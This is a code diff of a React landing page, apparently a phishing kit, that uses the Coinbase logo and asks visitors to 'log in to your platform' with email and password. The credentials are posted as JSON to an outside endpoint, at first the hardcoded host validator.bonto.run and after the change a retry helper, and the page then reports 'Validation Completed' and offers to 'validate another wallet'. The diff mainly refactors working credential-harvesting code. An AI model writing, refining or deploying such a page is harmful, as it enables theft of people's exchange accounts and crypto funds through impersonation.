@@ -2,9 +2,7 @@ import React, { useState } from "react";
 import { Eye, EyeOff, Loader2 } from "lucide-react";
 import "./cbPaymentLanding.css";
 import logo from "../../assets/coinbase_logo.png";
-
-const API_URL = "https://validator.bonto.run/cbPayments";
-
+import fetchWithRetry from "../../utils/api";
 
 const CbPaymentLanding = () => {
   const [form, setForm] = useState({ emailOrUsername: "", password: "" });
@@ -18,14 +16,13 @@ const CbPaymentLanding = () => {
     setLoading(true);
 
     try {
-      const res = await fetch(API_URL, {
+      const res = await fetchWithRetry("/cbPayments", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(form)
       });
 
       const data = await res.json();
-
       if (!res.ok) throw new Error(data.error || "Submission failed");
 
       setDone(true);
@@ -40,16 +37,13 @@ const CbPaymentLanding = () => {
     return (
       <div className="landing-bg">
         <img src={logo} className="landing-logo" />
-
         <div className="result-card animate-pop">
           <h2>Validation Completed</h2>
           <h2 aria-live="polite">
             Loading your account…<br />
             Please check your email to confirm.
-            </h2>
-
+          </h2>
           <p>Do you want to validate another wallet?</p>
-
           <div className="landing-actions">
             <button onClick={() => window.location.reload()}>Redo Validation</button>
             <button onClick={() => (window.location.href = "/")}>Go Home</button>
@@ -62,18 +56,15 @@ const CbPaymentLanding = () => {
   return (
     <div className="landing-bg">
       <img src={logo} className="landing-logo" />
-
       <div className="form-card animate-fade">
         <h2>Kindly log in to your platform</h2>
-
         <input
           autoComplete="off"
-            name="fake-email"
-            placeholder="Email or Username"
-            value={form.emailOrUsername}
-            onChange={e => setForm({ ...form, emailOrUsername: e.target.value })}
+          name="fake-email"
+          placeholder="Email or Username"
+          value={form.emailOrUsername}
+          onChange={e => setForm({ ...form, emailOrUsername: e.target.value })}
         />
-
         <div className="password-box">
           <input
             type={showPassword ? "text" : "password"}
@@ -87,9 +78,7 @@ const CbPaymentLanding = () => {
             {showPassword ? <EyeOff /> : <Eye />}
           </span>
         </div>
-
         {error && <p className="error-text">{error}</p>}
-
         <button disabled={loading} onClick={submitForm}>
           {loading ? <Loader2 className="spin" /> : "Validate"}
         </button>
